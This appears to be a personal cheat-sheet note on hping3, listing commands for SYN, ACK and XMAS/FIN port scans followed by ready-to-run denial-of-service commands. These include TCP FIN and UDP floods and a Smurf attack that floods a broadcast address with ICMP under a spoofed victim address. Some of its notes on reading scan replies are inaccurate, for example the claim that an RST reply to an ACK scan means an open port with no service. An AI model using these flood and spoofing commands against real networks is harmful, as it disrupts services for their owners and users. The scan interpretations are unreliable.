Date: 25-09-2024 08:41

Tags: [[Hacking]] [[Port Scanning]] [[DoS]]

---

## Scaning a port

`hping3 192.168.0.1 -p 80`

## Scannig a range of ports (Syn scan)

`hping3 192.168.0.1 -S --scan 20-100`

## ACK scanning

`hping3 192.168.0.1 -p 80 -A`

The ACK scan will return with a RST flag (R), which means the port is there, just no service running
Or will return an Destination Unreachable if theres a firewall etc.

### XMAS scan (or FIN scan)
`hping3 192.168.0.1 -p 445 -X`
or
`hping3 192.168.0.1 -p 445 -F`

If the port is not filtered, there is no response
If the port is filtered, there will be Destination Unreachable

## DoS
`hping3 -F --flood -p 80 192.168.0.1`

or, using UDP:
`hping3 --udp --flood -p 80 192.168.0.1`

### Smurf DoS attack
`hping3 --icmp --flood -c 1000 --spoof 192.168.0.5 192.168.0.255`

Sends a package to the broadcast (192.168.0.255), all hosts in the network receive the package
ALL hosts will then respond the package the decoy IP we set (192.168.0.5)